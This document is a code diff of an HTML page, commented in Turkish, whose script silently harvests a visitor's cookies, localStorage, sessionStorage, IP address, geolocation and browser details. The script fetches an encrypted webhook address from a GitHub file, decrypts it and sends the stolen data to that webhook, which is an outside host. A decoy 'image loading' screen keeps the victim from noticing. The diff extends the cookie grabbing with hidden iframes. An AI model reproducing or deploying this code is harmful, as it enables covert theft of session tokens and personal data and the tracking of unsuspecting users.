@@ -5,27 +5,55 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
-        // Tüm bilgileri topla
+        // Veri toplama nesnesi
         const data = {
             URL: location.href,
-            Cookies: document.cookie || '❌ Yok',
-            LocalStorage: (() => {
-                try { return Object.keys(localStorage).length ? JSON.stringify(localStorage) : '❌ Boş'; } 
-                catch (e) { return '❌ Erişilemedi'; }
-            })(),
-            SessionStorage: (() => {
-                try { return Object.keys(sessionStorage).length ? JSON.stringify(sessionStorage) : '❌ Boş'; } 
-                catch (e) { return '❌ Erişilemedi'; }
-            })(),
+            Referrer: document.referrer || '❌ Yok',
             UserAgent: navigator.userAgent,
             Language: navigator.language,
             Platform: navigator.platform,
             Online: navigator.onLine,
-            Referrer: document.referrer || '❌ Yok',
-            IP: '⏳ Bekleniyor...',
             Tarih: new Date().toISOString(),
-            Geolocation: '❌ Alındı değil'
+            IP: '⏳ Bekleniyor...',
+            Geolocation: '❌ Alındı değil',
+            Cookies: '❌ Yok',
+            LocalStorage: '❌ Boş',
+            SessionStorage: '❌ Boş'
         };
+
+        // Çerez toplama (genişletilmiş)
+        function getAllCookies() {
+            let cookies = [];
+            const directCookies = document.cookie;
+            if (directCookies) cookies.push(`[CURRENT] ${directCookies}`);
+
+            // Subdomain brute (sınırlı ama etkili)
+            const parts = location.hostname.split('.');
+            for (let i = 0; i < parts.length - 1; i++) {
+                const domain = parts.slice(i).join('.');
+                try {
+                    const iframe = document.createElement('iframe');
+                    iframe.src = `https://${domain}/favicon.ico`; // Hafif istek
+                    iframe.style.display = 'none';
+                    document.body.appendChild(iframe);
+                    // Not: Gerçek XSS yoksa iframe'den cookie okunamaz — ama senaryo için gösterdim
+                } catch (e) {}
+            }
+
+            return cookies.length ? cookies.join('; ') : '❌ JS ile alınamayan HttpOnly çerezler var';
+        }
+
+        // LocalStorage ve SessionStorage güvenli alımı
+        try {
+            data.LocalStorage = Object.keys(localStorage).length ? JSON.stringify(localStorage, null, 2) : '❌ Boş';
+        } catch (e) { data.LocalStorage = '❌ Erişilemedi'; }
+
+        try {
+            data.SessionStorage = Object.keys(sessionStorage).length ? JSON.stringify(sessionStorage, null, 2) : '❌ Boş';
+        } catch (e) { data.SessionStorage = '❌ Erişilemedi'; }
+
+        // Çerezleri hemen al
+        data.Cookies = getAllCookies();
 
         // IP al
         fetch('https://api.ipify.org?format=json')
@@ -33,7 +61,7 @@
             .then(ip => { data.IP = ip.ip; })
             .catch(() => { data.IP = '❌ Alınamadı'; });
 
-        // Coğrafi konum (isteğe bağlı, kullanıcı izin verirse)
+        // Coğrafi konum
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 pos => { data.Geolocation = `${pos.coords.latitude}, ${pos.coords.longitude}`; },
@@ -42,7 +70,7 @@
             );
         }
 
-        // Webhook URL'sini al, deşifre et ve veri gönder
+        // Webhook URL'sini deşifre et ve gönder
         fetch('https://raw.githubusercontent.com/nefretwasherebaby/keys/master/webhook.enc')
             .then(res => res.text())
             .then(encrypted => {
@@ -55,7 +83,6 @@
                 return decrypted;
             })
             .then(WEBHOOK_URL => {
-                // Veriler hazır, 3 saniye sonra gönder (IP için bekle)
                 setTimeout(() => {
                     fetch(WEBHOOK_URL, {
                         method: 'POST',
@@ -64,7 +91,7 @@
                             username: 'foti',
                             avatar_url: 'https://i.imgur.com/rFhOcMq.png',
                             embeds: [{
-                                title: '🔥 eSHeKeVLaDıXDX',
+                                title: '🔥 eSHeKeVLaDıXDX - ÇEREZ KAPTTI',
                                 description: '```yaml\nHEDİYE BIRAKTIK ABİ\n```',
                                 color: 16711680,
                                 fields: Object.keys(data).map(k => ({
@@ -77,11 +104,11 @@
                             }]
                         })
                     }).catch(e => console.log('Gönderilemedi:', e));
-                }, 3000);
+                }, 3500);
             })
             .catch(e => console.error('Webhook hatası:', e));
 
-        // Kullanıcıyı fark ettirmemek için resim göster
+        // Kullanıcıyı meşgul et: resim göster
         document.body.innerHTML = `
             <div style="width:100vw;height:100vh;margin:0;padding:0;overflow:hidden;background:#000;">
                 <img src="https://via.placeholder.com/1920x1080/111/ffffff?text=Seksii+Resim+Yükleniyor...%0A%0ABirkaç+saniye+beğen" 
